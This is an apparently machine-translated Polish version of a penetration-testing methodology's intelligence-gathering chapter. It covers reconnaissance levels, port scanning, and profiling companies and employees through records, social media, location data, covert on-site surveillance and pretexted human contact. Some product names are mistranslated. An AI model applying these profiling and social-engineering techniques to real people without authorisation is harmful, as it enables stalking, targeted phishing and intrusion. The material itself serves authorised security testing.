(pomyśl: sponsorowany przez państwo) Bardziej zaawansowany pentest, Redteam, pełny zakres. Wszystkie informacje z poziomu 1 i poziomu 2 wraz z wieloma ręcznymi analizami. Pomyśl o kultywowaniu relacji w SocNet, ciężkiej analizie, głębokim zrozumieniu relacji biznesowych, najprawdopodobniej dużej liczbie godzin na zebranie i korelację.

Zespół Armii Czerwonej ma za zadanie przeanalizować i zaatakować segment sieci armii w obcym kraju, aby znaleźć słabe punkty, które mogłyby zostać wykorzystane przez cudzoziemca. W tym przypadku odpowiednie byłoby podjęcie działań w zakresie gromadzenia informacji na poziomie 3.

Zdobywanie informacji
Co to jest
Intelligence Gathering przeprowadza rekonesans przeciwko celowi, aby zebrać jak najwięcej informacji, które można wykorzystać podczas penetracji celu podczas oceny podatności i faz eksploatacji. Im więcej informacji uda Ci się zebrać w tej fazie, tym więcej wektorów ataku możesz wykorzystać w przyszłości.

Wywiad typu open source (OSINT) to forma zarządzania zbiorami danych wywiadowczych, która obejmuje wyszukiwanie, selekcję i pozyskiwanie informacji z publicznie dostępnych źródeł oraz analizowanie ich w celu uzyskania użytecznych informacji. [1]

Po co to robić
Przeprowadzamy gromadzenie danych Open Source Intelligence w celu określenia różnych punktów wejścia do organizacji. Te punkty wejścia mogą być fizyczne, elektroniczne i/lub ludzkie. Wiele firm nie bierze pod uwagę, jakie informacje o sobie udostępniają publicznie i jak te informacje mogą zostać wykorzystane przez zdeterminowanego atakującego. Ponadto wielu pracowników nie bierze pod uwagę, jakie informacje o sobie umieszczają publicznie i jak te informacje mogą zostać wykorzystane do zaatakowania ich samych lub ich pracodawcy.

Co to nie jest
OSINT może nie być dokładny lub aktualny. Źródła informacji mogą być celowo/przypadkowo zmanipulowane w celu odzwierciedlenia błędnych danych, informacje mogą stać się przestarzałe w miarę upływu czasu lub po prostu być niekompletne.

Nie obejmuje nurkowania w śmietnikach ani żadnych metod odzyskiwania informacji o firmie z fizycznych przedmiotów znalezionych na terenie firmy.

Wybór celu
Identyfikacja i nazewnictwo celu
Zbliżając się do organizacji docelowej, ważne jest, aby zrozumieć, że firma może mieć wiele różnych domen najwyższego poziomu (TDL) i firm pomocniczych. Chociaż informacje te powinny były zostać odkryte na etapie ustalania zakresu, nie jest niczym niezwykłym zidentyfikowanie dodatkowych domen serwerów i firm, które mogły nie być częścią początkowego zakresu omówionego na etapie wstępnego zaangażowania. Na przykład firma może mieć TDL .com. Mogą jednak mieć również domeny .net .co i .xxx. Mogą one wymagać uwzględnienia w zmienionym zakresie lub mogą być niedostępne. Tak czy inaczej, należy to uzgodnić z klientem przed rozpoczęciem testowania. Nie jest też niczym niezwykłym, że firma ma pod sobą kilka spółek podrzędnych. Na przykład General Electric i Proctor and Gamble są właścicielami wielu mniejszych firm.

Weź pod uwagę wszelkie ograniczenia Zasad zaangażowania
W tym momencie warto zapoznać się z Zasadami Zaangażowania. Często zapomina się o nich podczas testu. Czasami jako testerzy jesteśmy tak pochłonięci tym, co znajdujemy i możliwościami ataku, że zapominamy, które adresy IP, domeny i sieci możemy zaatakować. Zawsze odwołuj się do Zasad zaangażowania, aby zachować koncentrację na testach. Jest to ważne nie tylko z perspektywy prawnej, ale także z punktu widzenia pełzania zakresu. Za każdym razem, gdy odchodzisz od głównych celów testu, tracisz czas. A na dłuższą metę może to kosztować Twoją firmę pieniądze.

Rozważ czas trwania testu
Ilość czasu przeznaczonego na cały test będzie miała bezpośredni wpływ na ilość zbierania danych wywiadowczych, które można wykonać. Istnieją testy, w których całkowity czas wynosi od dwóch do trzech miesięcy. Podczas tych zadań firma testująca spędzałaby ogromną ilość czasu na analizowaniu każdej z podstawowych jednostek biznesowych i personelu firmy. Jednak w przypadku krótszych testów w stylu kryształowego pudełka cele mogą być znacznie bardziej taktyczne. Na przykład testowanie określonej aplikacji internetowej może nie wymagać badania dokumentacji finansowej dyrektora generalnego firmy.

Rozważ cel końcowy testu
Każdy test ma na uwadze cel końcowy — konkretny zasób lub proces, który organizacja uważa za krytyczny. Mając na uwadze wynik końcowy, faza zbierania informacji powinna uwzględniać wszystkie drugorzędne i trzeciorzędne elementy otaczające cel końcowy. Niezależnie od tego, czy są to technologie wspierające, osoby trzecie, odpowiedni personel itp. Upewnienie się, że skupiono się na krytycznych zasobach, zapewnia, że ​​mniej istotne elementy wywiadowcze są usuwane z priorytetów i kategoryzowane jako takie, aby nie ingerować w proces analizy.

OSINT
Open Source Intelligence (OSINT) przybiera trzy formy; Pasywne, półpasywne i aktywne.

Pasywne zbieranie informacji : Pasywne zbieranie informacji jest ogólnie przydatne tylko wtedy, gdy istnieje bardzo wyraźny wymóg, aby działania związane z gromadzeniem informacji nigdy nie zostały wykryte przez cel. Ten rodzaj profilowania jest technicznie trudny do wykonania, ponieważ nigdy nie wysyłamy żadnego ruchu do organizacji docelowej ani z jednego z naszych hostów, ani z „anonimowych” hostów lub usług w Internecie. Oznacza to, że możemy wykorzystywać i gromadzić tylko zarchiwizowane lub przechowywane informacje. W związku z tym informacje te mogą być nieaktualne lub nieprawidłowe, ponieważ jesteśmy ograniczeni do wyników zebranych od osób trzecich.

Półpasywne zbieranie informacji : Celem półpasywnego zbierania informacji jest profilowanie celu za pomocą metod, które wyglądają jak normalny ruch i zachowanie w Internecie. Odpytujemy tylko opublikowane serwery nazw w celu uzyskania informacji, nie przeprowadzamy dogłębnych wyszukiwań wstecznych ani żądań DNS typu brute force, nie szukamy „nieopublikowanych” serwerów ani katalogów. Nie przeprowadzamy skanowania portów ani robotów indeksujących na poziomie sieci i patrzymy tylko na metadane w opublikowanych dokumentach i plikach; nie poszukują aktywnie ukrytych treści. Kluczem jest tu nie zwracanie uwagi na nasze działania. Post mortem cel może być w stanie cofnąć się i odkryć działania zwiadowcze, ale nie powinien być w stanie nikomu ich przypisać.

Aktywne zbieranie informacji : Aktywne zbieranie informacji powinno zostać wykryte przez cel i podejrzane lub złośliwe zachowanie. Na tym etapie aktywnie mapujemy infrastrukturę sieciową (pomyśl o pełnym skanowaniu portów nmap –p1-65535), aktywnie wyliczamy i/lub skanujemy otwarte usługi pod kątem luk w zabezpieczeniach, aktywnie szukamy nieopublikowanych katalogów, plików i serwerów. Większość z tych działań mieści się w typowych czynnościach „rozpoznawczych” lub „skanujących” pod kątem standardowego pentestu.

Zbiorowy
Fizyczny
Lokalizacje (L1)
W podziale na lokalizację wykaz pełnych adresów, własności, powiązanych dokumentów (miasto, podatki, prawne itp.), pełny wykaz wszystkich fizycznych środków bezpieczeństwa w danej lokalizacji (umiejscowienie kamer, czujniki, ogrodzenia, posterunki strażnicze, kontrola wejść, bramy, rodzaj identyfikacji , wejście dostawcy, fizyczne lokalizacje oparte na blokach IP/usługach geolokalizacyjnych itp. Dla Hostów/NOC: Pełna notacja CIDR hostów i sieci, pełna lista DNS wszystkich powiązanych zasobów, Pełne mapowanie AS, ścieżki peeringu, udostępnianie CDN, właściciele bloków sieciowych (dane whois), rekordy e-mail (MX + struktura adresu e-mail)

Właściciel (L1/L2)
Ewidencja gruntów/podatków (L1/L2)
Wspólne/indywidualne (L1/L2)
Strefy czasowe (L1/L2)
Gospodarze / NOC
Wszechobecność (L1)
Nierzadko organizacja docelowa ma wiele oddzielnych lokalizacji fizycznych. Na przykład bank będzie miał biura centralne, ale będzie miał również wiele zdalnych oddziałów. Podczas gdy bezpieczeństwo fizyczne i techniczne może być bardzo dobre w centralnych lokalizacjach, odległe lokalizacje często mają słabe kontrole bezpieczeństwa.

Relacje (L1)
Partnerzy biznesowi, służby celne, dostawcy, analizy za pośrednictwem tego, co jest otwarcie udostępniane na korporacyjnych stronach internetowych, w wypożyczalniach itp. Informacje te można wykorzystać do lepszego zrozumienia projektów biznesowych lub organizacyjnych. Na przykład, jakie produkty i usługi są krytyczne dla organizacji docelowej?

Informacje te można również wykorzystać do stworzenia udanych scenariuszy socjotechnicznych.

Relacje (L2/L3)
Ręczna analiza w celu sprawdzenia informacji z poziomu 1 oraz zagłębienia się w możliwe relacje.
Współdzielona przestrzeń biurowa (L2/L3)
Infrastruktura współdzielona (L2/L3)
Wypożyczony/leasingowany sprzęt (L2/L3)
Logiczny
Zgromadzone informacje dla partnerów, klientów i konkurentów: dla każdego z nich pełna lista nazwy firmy, adresu firmy, rodzaju relacji, podstawowych informacji finansowych, podstawowych informacji o hostach/sieci.

Partnerzy Biznesowi (L1/L2/L3)
Reklamowani partnerzy biznesowi celu. Czasami reklamowane na głównej stronie www.
Klienci biznesowi (L1/L2/L3)
Reklamowani klienci biznesowi celu. Czasami reklamowane na głównej stronie www.
Zawodnicy (L1/L2/L3)
Kim są konkurenci celu. Może to być proste, Ford vs Chevy, lub może wymagać znacznie więcej analiz.
Wykres dotykowy (L1)
Touchgraph (wizualna reprezentacja społecznych powiązań między ludźmi) pomoże nakreślić możliwe interakcje między ludźmi w organizacji i jak uzyskać do nich dostęp z zewnątrz (kiedy touchgraph obejmuje społeczności zewnętrzne i jest tworzony z poziomem głębi powyżej 2).
Podstawowy wykres dotykowy powinien odzwierciedlać strukturę organizacyjną wynikającą z dotychczas zebranych informacji i na jego podstawie powinna opierać się dalsza rozbudowa wykresu (ponieważ zwykle lepiej odzwierciedla on koncentrację na aktywach organizacji i wyjaśnia możliwe wektory podejścia.
Profil odkurzacza (L1/L2)
Co: półotwarty zasób wywiadowczy (zwykle płatne subskrypcje). Takie źródła specjalizują się w gromadzeniu informacji biznesowych o firmach i dostarczaniu „znormalizowanego” spojrzenia na biznes.
Dlaczego: Informacje obejmują fizyczne lokalizacje, otoczenie konkurencyjne, kluczowy personel, informacje finansowe i inne dane związane z działalnością (w zależności od źródła). Można to wykorzystać do stworzenia dokładniejszego profilu celu i zidentyfikowania dodatkowego personelu i osób trzecich, które można wykorzystać w teście.
Jak: Proste wyszukiwanie na stronie z nazwą firmy zapewnia pełny profil firmy i wszystkie informacje, które są na niej dostępne. Zaleca się korzystanie z kilku źródeł w celu ich wzajemnego odniesienia i upewnienia się, że otrzymujesz najbardziej aktualne informacje. (płatny za usługę).
Linia produktów (L2/L3)
Oferta produktowa celu, która może wymagać dodatkowej analizy, jeśli cel oferuje również usługi, może wymagać dalszej analizy.
Pionowy rynek (L1)
W jakiej branży rezyduje cel, tj. finansowa, obronna, rolnicza, rządowa itp
Konta marketingowe (L2/L3)
Działania marketingowe mogą dostarczyć wielu informacji na temat strategii marketingowej celu
Oceń wszystkie sieci mediów społecznościowych pod kątem profili społecznościowych celu
Oceń przeszłe * kampanie marketingowe celu
Spotkania (L2/L3)
Opublikowano protokół ze spotkania?
Spotkania otwarte dla publiczności?
Znaczące daty firmy (L1/L2/L3)
Spotkanie zarządu
Wakacje
rocznice
Uruchomienie produktu/usługi
Oferty pracy (L1/L2)
Przeglądając listę ofert pracy w organizacji (zwykle znajdującą się w sekcji „kariera” na ich stronie internetowej), możesz określić rodzaje technologii używanych w organizacji. Jednym z przykładów może być sytuacja, w której organizacja ma ofertę pracy dla starszego administratora systemu Solaris, wtedy jest całkiem oczywiste, że organizacja korzysta z systemów Solaris. Inne stanowiska mogą nie być tak oczywiste na podstawie nazwy stanowiska, ale otwarte stanowisko młodszego administratora sieci może sugerować, że „preferowane CCNA” lub „preferowane JNCIA”, co oznacza, że ​​korzystają z technologii Cisco lub Juniper.
Przynależność do organizacji charytatywnych (L1/L2/L3)
Bardzo często zdarza się, że członkowie kierownictwa docelowej organizacji są związani z organizacjami charytatywnymi. Informacje te można wykorzystać do opracowania solidnych scenariuszy inżynierii społecznej dla kadry kierowniczej.
Zapytanie ofertowe, zapytanie ofertowe i inne informacje o przetargach publicznych (L1/L2)
Zapytania ofertowe i zapytania ofertowe często ujawniają wiele informacji o typach systemów używanych przez firmę, a potencjalnie nawet o lukach lub problemach z jej infrastrukturą.
Dowiedzenie się, kim są obecni zwycięzcy przetargów, może ujawnić typy używanych systemów lub lokalizację, w której zasoby firmy mogą być hostowane poza siedzibą firmy.
Akta sądowe (L2/L3)
Akta sądowe są zwykle dostępne bezpłatnie lub czasami za opłatą.
Treść postępowania sądowego może ujawnić informacje o wcześniejszych osobach składających skargę, w tym między innymi o pozwach byłych pracowników
Rejestry karne obecnych i byłych pracowników mogą zawierać listę celów dla działań socjotechnicznych
Darowizny polityczne (L2/L3)
Mapowanie darowizn politycznych lub innych interesów finansowych jest ważne w celu zidentyfikowania kluczowych osób, które mogą nie zajmować oczywistych stanowisk władzy, ale mają własny interes (lub jest nim zainteresowany).
Mapowanie darowizn na cele polityczne będzie się różnić w zależności od kraju w zależności od wolności informacji, ale często przypadki darowizn z innych krajów można prześledzić wstecz, korzystając z dostępnych tam danych.
Licencje lub rejestry zawodowe (L2/L3)
Zebranie listy docelowych licencji zawodowych i rejestrów może dać wgląd nie tylko w to, jak firma działała, ale także w wytyczne i przepisy, których przestrzegają, aby utrzymać te licencje. Doskonałym tego przykładem jest certyfikacja standardu ISO firmy, która może wykazać, że firma przestrzega ustalonych wytycznych i procesów. Ważne jest, aby tester był świadomy tych procesów i tego, jak mogą one wpłynąć na testy przeprowadzane w organizacji.
Firma często umieszcza te informacje na swojej stronie internetowej jako odznakę honorową. W innych przypadkach może być konieczne przeszukanie rejestrów dla danej branży w celu sprawdzenia, czy organizacja jest członkiem. Dostępne informacje są bardzo zależne od rynku pionowego, a także położenia geograficznego firmy. Należy również zauważyć, że firmy międzynarodowe mogą mieć różne licencje i być zobowiązane do rejestracji w różnych standardach lub organach prawnych w zależności od kraju.
Schemat organizacyjny (L1)
Identyfikacja pozycji
Ważne osoby w organizacji
Osoby do konkretnego celu
Transakcje
Mapowanie zmian w organizacji (awansy, ruchy boczne)
Partnerzy
Mapowanie organizacji stowarzyszonych, które są powiązane z biznesem

Elektroniczny
Metadane dokumentu (L1/L2)
Co to jest? Metadane lub metatreść dostarczają informacji o danych/dokumencie w zakresie. Może zawierać informacje, takie jak nazwisko autora/twórcy, czas i data, używane/odwołane standardy, lokalizacja w sieci komputerowej (informacje o drukarce/folderze/katalogu/itp.), znaczniki geograficzne itp. W przypadku obrazu jego metadane mogą zawierają kolor, głębię, rozdzielczość, markę/typ aparatu, a nawet współrzędne i informacje o lokalizacji.
Dlaczego miałbyś to zrobić? Metadane są ważne, ponieważ zawierają informacje o sieci wewnętrznej, nazwach użytkowników, adresach e-mail, lokalizacjach drukarek itp. i pomogą w stworzeniu planu lokalizacji. Zawiera również informacje o oprogramowaniu użytym do tworzenia poszczególnych dokumentów. Może to umożliwić atakującemu utworzenie profilu i/lub przeprowadzenie ukierunkowanych ataków z wewnętrzną wiedzą na temat sieci i użytkowników.
Jak byś to zrobił? Dostępne są narzędzia do wyodrębniania metadanych z pliku (pdf/word/image), takie jak FOCA (oparte na GUI), metagoofil (oparte na Pythonie), meta-extractor, exiftool (oparte na Perlu). Narzędzia te są w stanie wyodrębnić i wyświetlić wyniki w różnych formatach, takich jak HTML, XML, GUI, JSON itp. Dane wejściowe do tych narzędzi to głównie dokument pobrany z publicznej obecności „klienta”, a następnie przeanalizowany, aby dowiedzieć się więcej na jego temat . Podczas gdy FOCA pomaga wyszukiwać dokumenty, pobierać je i analizować za pośrednictwem interfejsu GUI.
Komunikacja marketingowa (L1/L2)
Przeszłe kampanie marketingowe dostarczają informacji o projektach, które mogły zostać wycofane i które mogą być nadal dostępne.
Obecna komunikacja marketingowa zawiera elementy projektu (kolory, czcionki, grafikę itp.), które w większości są również wykorzystywane wewnętrznie.
Dodatkowe informacje kontaktowe, w tym zewnętrzne organizacje marketingowe.
Zasoby infrastrukturalne
Posiadane bloki sieciowe (L1)
Bloki sieciowe należące do organizacji można uzyskać pasywnie, przeprowadzając wyszukiwania whois. DNSStuff.com to punkt kompleksowej obsługi umożliwiający uzyskiwanie tego typu informacji.
Wyszukiwanie adresów IP w otwartym kodzie źródłowym może dostarczyć informacji o typach infrastruktury w miejscu docelowym. Administratorzy często publikują informacje o adresie IP w kontekście próśb o pomoc w różnych witrynach pomocy technicznej.
Adresy e-mail (L1)
Adresy e-mail zapewniają potencjalną listę prawidłowych nazw użytkowników i struktury domen
Adresy e-mail można zbierać z wielu źródeł, w tym ze stron internetowych organizacji.
Profil infrastruktury zewnętrznej (L1)
Profil infrastruktury zewnętrznej celu może dostarczyć ogromnej ilości informacji na temat technologii wykorzystywanych wewnętrznie.
Informacje te można zbierać z wielu źródeł, zarówno pasywnie, jak i aktywnie.
Profil powinien być wykorzystany przy konstruowaniu scenariusza ataku na infrastrukturę zewnętrzną.
Zastosowane technologie (L1/L2)
OSINT przeszukuje fora wsparcia, listy mailingowe i inne zasoby, które mogą gromadzić informacje o technologiach wykorzystywanych przez cel
Wykorzystanie inżynierii społecznej przeciwko zidentyfikowanej organizacji informatycznej
Stosowanie inżynierii społecznej przeciwko sprzedawcom produktów
Umowy zakupu (L1/L2/L3)
Umowy kupna zawierają informacje o sprzęcie, oprogramowaniu, licencjach i dodatkowych środkach trwałych znajdujących się w miejscu docelowym.
Zdalny dostęp (L1/L2)
Uzyskanie informacji o tym, jak pracownicy i/lub klienci łączą się z celem dostępu zdalnego, stanowi potencjalny punkt wejścia.
Często link do portalu zdalnego dostępu jest dostępny poza stroną główną celu
Dokumenty How To ujawniają aplikacje/procedury umożliwiające nawiązywanie połączeń dla użytkowników zdalnych
Użycie aplikacji (L1/L2)
Zbierz listę znanych aplikacji używanych przez organizację docelową. Często można to osiągnąć, wyodrębniając metadane z publicznie dostępnych plików (jak omówiono wcześniej)

Technologie obronne (L1/L2/L3)
Używane technologie obronne polegające na pobieraniu odcisków palców można osiągnąć na wiele sposobów, w zależności od stosowanych zabezpieczeń.

Pasywne pobieranie odcisków palców
Przeszukaj fora i publicznie dostępne informacje, na których technicy docelowej organizacji mogą omawiać problemy lub prosić o pomoc w zakresie używanej technologii
Wyszukiwanie informacji marketingowych dla docelowej organizacji oraz popularnych dostawców technologii
Za pomocą Tin-eye (lub innego narzędzia do dopasowywania obrazów) wyszukaj logo docelowej organizacji, aby zobaczyć, czy jest ono wymienione na stronach referencyjnych dostawców lub w materiałach marketingowych
Aktywne pobieranie odcisków palców
Wyślij odpowiednie pakiety próbne do systemów publicznych, aby przetestować wzorce blokowania. Istnieje kilka narzędzi do pobierania odcisków palców określonych typów WAF.
Informacje nagłówkowe zarówno w odpowiedziach z docelowej strony internetowej, jak i w wiadomościach e-mail często zawierają informacje nie tylko o używanych systemach, ale także o włączonych konkretnych mechanizmach ochronnych (np. skanery antywirusowe bramy pocztowej)
Zdolność człowieka (L1/L2/L3)
Odkrywanie ludzkich zdolności obronnych docelowej organizacji może być trudne. Istnieje kilka kluczowych informacji, które mogą pomóc w ocenie bezpieczeństwa docelowej organizacji.

Sprawdź obecność ogólnofirmowego zespołu CERT/CSIRT/PSRT
Sprawdź ogłoszenia o pracę, aby zobaczyć, jak często wymienione jest stanowisko bezpieczeństwa
Sprawdź ogłoszenia o pracę, aby zobaczyć, czy bezpieczeństwo jest wymienione jako wymóg dla zadań niezwiązanych z bezpieczeństwem (np. programiści)
Sprawdź umowy outsourcingu, aby zobaczyć, czy bezpieczeństwo celu zostało zlecone częściowo lub w całości
Sprawdź, czy konkretne osoby pracujące dla firmy mogą być aktywne w społeczności zajmującej się bezpieczeństwem
Budżetowy
Raportowanie (L1/L2)
Docelowa sprawozdawczość finansowa będzie w dużym stopniu zależała od lokalizacji organizacji. Raportowanie może być również dokonywane za pośrednictwem centrali organizacji, a nie dla każdego oddziału. W 2008 roku SEC wydała propozycję planu działania dotyczącego przyjęcia Międzynarodowych Standardów Sprawozdawczości Finansowej (MSSF) w USA.

Przyjęcie MSSF według kraju --> http://www.iasplus.com/en/resources/use-of-ifrs

Analiza rynku (L1/L2/L3)
Uzyskaj raporty z analizy rynku od organizacji analitycznych (takich jak Gartner, IDC, Forrester, 541 itp.). Powinno to obejmować definicję rynku, kapitalizację rynkową, konkurentów oraz wszelkie istotne zmiany w wycenie, produkcie lub firmie w ogóle.
Kapitał handlowy
Zidentyfikuj, czy organizacja przeznacza jakikolwiek kapitał handlowy i jaki procent ogólnej wyceny i wolnego kapitału posiada. Wskaże to, jak wrażliwa jest organizacja na wahania rynkowe i czy jest uzależniona od inwestycji zewnętrznych w ramach swojej wyceny i przepływów pieniężnych.
Historia wartości
Wykres wyceny organizacji w czasie, w celu ustalenia korelacji między zdarzeniami zewnętrznymi i wewnętrznymi oraz ich wpływu na wycenę.
EDGAR (SEC)
Co to jest: EDGAR (system elektronicznego gromadzenia, analizy i wyszukiwania danych) to baza danych amerykańskiej Komisji ds. Bezpieczeństwa i Giełd (SEC), która zawiera oświadczenia rejestracyjne, raporty okresowe i inne informacje dotyczące wszystkich firm (zarówno zagranicznych, jak i krajowych) którzy są prawnie zobowiązani do złożenia.
Dlaczego to zrobić: Dane EDGAR są ważne, ponieważ oprócz informacji finansowych identyfikują kluczowy personel w firmie, który w inny sposób może nie być widoczny na stronie internetowej firmy lub w innej publicznej obecności. Zawiera również oświadczenia o wynagrodzeniach kadry zarządzającej, nazwiska i adresy głównych właścicieli akcji zwykłych, podsumowanie postępowań sądowych przeciwko spółce, czynniki ryzyka ekonomicznego i inne potencjalnie interesujące dane.
Jak uzyskać: Informacje są dostępne na stronie internetowej SEC EDGAR ( http://www.sec.gov/edgar.shtml ). Szczególnie interesujące są raporty 10-K (raport roczny) i 10-Q (raport kwartalny).
Indywidualny
Pracownik
Historia
Akta sądowe (L2/L3)
Co to jest: Akta sądowe to wszystkie rejestry publiczne związane ze skargami karnymi i/lub cywilnymi, pozwami sądowymi lub innymi działaniami prawnymi na rzecz lub przeciwko osobie lub organizacji będącej przedmiotem zainteresowania.
Dlaczego miałbyś to zrobić: Akta sądowe mogą potencjalnie ujawnić poufne informacje dotyczące pojedynczego pracownika lub całej firmy. Te informacje mogą być przydatne same w sobie lub mogą być motorem do uzyskania dodatkowych informacji. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych sądów i baz danych akt. Niektóre dodatkowe informacje mogą być dostępne za pośrednictwem płatnych usług, takich jak LEXIS/NEXIS. Niektóre informacje mogą być dostępne na prośbę o rejestrację lub osobiście.
Darowizny polityczne (L2/L3)
Co to jest: darowizny na cele polityczne to osobiste fundusze danej osoby kierowane do określonych kandydatów politycznych, partii politycznych lub organizacji o specjalnym interesie.
Dlaczego miałbyś to robić: informacje o darowiznach na cele polityczne mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te można wykorzystać jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a politykami, kandydatami politycznymi lub innymi organizacjami politycznymi. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych (np. http://www.opensecrets.org/ ), które śledzą indywidualne darowizny na cele polityczne. W zależności od prawa danego stanu, darowizny powyżej określonej kwoty zwykle muszą być rejestrowane.
Licencje lub rejestry zawodowe (L2/L3)
Co to jest: licencje lub rejestry zawodowe to repozytoria informacji zawierające listy członków i inne powiązane informacje dotyczące osób, które uzyskały określoną licencję lub pewien stopień przynależności do społeczności.
Dlaczego miałbyś to zrobić: informacje o licencjach zawodowych mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te mogą być wykorzystane do sprawdzenia wiarygodności danej osoby (czy rzeczywiście posiadają określony certyfikat, jak twierdzą) lub jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a innymi organizacjami. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych. Zazwyczaj każda organizacja prowadzi własny rejestr informacji, które mogą być dostępne online lub których zebranie może wymagać dodatkowych czynności.
Profil sieci społecznościowej (SocNet).
Wyciek metadanych (L2/L3)
Świadomość lokalizacji za pomocą metadanych zdjęć
Ton (L2/L3)
Oczekiwany rezultat: subiektywna identyfikacja tonu używanego w komunikacji – agresywny, pasywny, atrakcyjny, sprzedażowy, chwalący, dyskredytujący, protekcjonalny, arogancki, elitarny, słabszy, przywódca, naśladowca, naśladownictwo itp.
Częstotliwość (L2/L3)
Oczekiwany rezultat: Określenie częstotliwości publikacji (raz na godzinę/dzień/tydzień itd.). Dodatkowo - pora dnia/tygodnia, w której najczęściej dochodzi do komunikacji.
Świadomość lokalizacji (L2/L3)
Historia lokalizacji na mapie dla profilowanej osoby z różnych źródeł, czy to poprzez bezpośrednią interakcję z aplikacjami i sieciami społecznościowymi, czy poprzez bierne uczestnictwo poprzez metadane zdjęć.
Aplikacje mapy Bing
czworokąt
Współrzędne Google
Skowyt
Gowalla
Obecność w mediach społecznościowych (L1/L2/L3)
Zweryfikuj konto/obecność celu w mediach społecznościowych (L1). I przedstaw szczegółową analizę (L2/L3)
Obecność w Internecie
Adres e-mail (L1)
Co to jest? Adresy e-mail to identyfikatory publicznych skrzynek pocztowych użytkowników.
Dlaczego miałbyś to zrobić? Zbieranie lub wyszukiwanie adresów e-mail jest ważne, ponieważ służy wielu celom - zapewnia prawdopodobny format identyfikatora użytkownika, który można później brutalnie wymusić w celu uzyskania dostępu, ale co ważniejsze, pomaga w wysyłaniu ukierunkowanego spamu, a nawet do zautomatyzowanych botów. Te wiadomości spamowe mogą zawierać exploity, złośliwe oprogramowanie itp. i mogą być adresowane z określoną treścią, szczególnie do użytkownika.
Jak byś to zrobił? Adresy e-mail można wyszukiwać i wyodrębniać z różnych stron internetowych, grup, blogów, forów, portali społecznościowych itp. Te adresy e-mail są również dostępne na różnych stronach pomocy technicznej. Istnieją narzędzia zbierające i pająki do wyszukiwania adresów e-mail mapowanych na określoną domenę (w razie potrzeby).
Osobiste uchwyty/pseudonimy (L1)
Zarejestrowane nazwy domen osobistych (L1/L2)
Przypisane statyczne adresy IP/bloki sieciowe (L1/L2)
Lokalizacja fizyczna
Lokalizacja fizyczna
Czy możesz ustalić fizyczną lokalizację celu
Ślad mobilny
Numer telefonu (L1/L2/L3)
Typ urządzenia (L1/L2/L3)
Użyj (L1/L2/L3)
Zainstalowane aplikacje (L1/L2/L3)
Właściciel/administrator (L1/L2/L3)

Informacje „za opłatą”.
Kontrole w tle
Za Pay Linked-In
LEXIS/NEXIS
Tajne zgromadzenie
Zbiorowy
Spotkanie na miejscu
Wybieranie konkretnych lokalizacji do zbierania na miejscu, a następnie przeprowadzanie rekonesansu w czasie (zwykle co najmniej 2-3 dni w celu zapewnienia wzorców). Podczas zbierania danych wywiadowczych na miejscu poszukiwane są następujące elementy:

Inspekcje bezpieczeństwa fizycznego
Skanowanie bezprzewodowe / skanowanie częstotliwości RF
Inspekcja szkoleń z zachowania pracowników
Obiekty dostępne/sąsiadujące (powierzchnie wspólne)
Nurkowanie w śmietniku
Rodzaje używanego sprzętu
Spotkanie poza siedzibą firmy
Identyfikacja lokalizacji poza siedzibą firmy i ich znaczenie/powiązanie z organizacją. Są to zarówno logiczne, jak i fizyczne lokalizacje, zgodnie z poniższym:

Lokalizacje centrów danych
Udostępnianie/dostawca sieci
HUMINT
Inteligencja ludzka uzupełnia bardziej pasywne gromadzenie zasobów, ponieważ dostarcza informacji, których nie można by uzyskać w inny sposób, a także dodaje więcej „osobistych” perspektyw do obrazu wywiadowczego (uczucia, historia, relacje między kluczowymi osobami, „atmosfera” itp. ...)

Metodologia pozyskiwania ludzkiej inteligencji zawsze wiąże się z bezpośrednią interakcją – czy to fizyczną, czy werbalną. Gromadzenie powinno odbywać się pod przybraną tożsamością, która zostałaby stworzona specjalnie w celu uzyskania optymalnej ekspozycji informacji i współpracy z danego zasobu.

Dodatkowo, zbieranie danych wywiadowczych na bardziej wrażliwych celach może odbywać się wyłącznie poprzez obserwację – ponownie fizycznie na miejscu lub za pomocą środków elektronicznych/zdalnych (CCTV, kamery internetowe itp.). Zwykle robi się to w celu ustalenia wzorców zachowań (takich jak częstotliwość wizyt, zasady ubioru, ścieżki dostępu, kluczowe lokalizacje, które mogą zapewniać dodatkowy dostęp, takie jak kawiarnie).

Wyniki
Kluczowi pracownicy
Partnerzy/Dostawcy
Inżynieria społeczna
Odcisk stopy
CO TO JEST: Zewnętrzne gromadzenie informacji, znane również jako footprinting, to faza gromadzenia informacji, która polega na interakcji z celem w celu uzyskania informacji z perspektywy zewnętrznej w stosunku do organizacji.

DLACZEGO: Wiele informacji można zebrać poprzez interakcję z celami. Sondując usługę lub urządzenie, często można stworzyć scenariusze, w których można pobrać odcisk palca lub jeszcze prościej, można uzyskać baner, który zidentyfikuje urządzenie. Ten krok jest niezbędny, aby zebrać więcej informacji o celach. Twoim celem, po tej sekcji, jest uszeregowana pod względem ważności lista celów.

Ślad zewnętrzny
Zidentyfikuj zewnętrzne zakresy klientów
Jednym z głównych celów zbierania danych wywiadowczych podczas testu penetracyjnego jest określenie hostów, które będą objęte zakresem. Istnieje wiele technik, które można wykorzystać do identyfikacji systemów, w tym odwrotne wyszukiwanie DNS, bruting DNS, wyszukiwanie WHOIS w domenach i zakresach. Te i inne techniki są udokumentowane poniżej.

Rekonesans pasywny
Wyszukiwania WHOIS
W przypadku śledzenia zewnętrznego najpierw musimy ustalić, który z serwerów WHOIS zawiera informacje, których szukamy. Biorąc pod uwagę, że powinniśmy znać TLD domeny docelowej, musimy po prostu zlokalizować rejestratora, u którego zarejestrowana jest domena docelowa.

Informacje WHOIS są oparte na hierarchii drzewa. ICANN (IANA) jest autorytatywnym rejestrem dla wszystkich domen TLD i jest doskonałym punktem wyjścia dla wszystkich ręcznych zapytań WHOIS.

ICANN – http://www.icann.org
IANA - http://www.iana.com
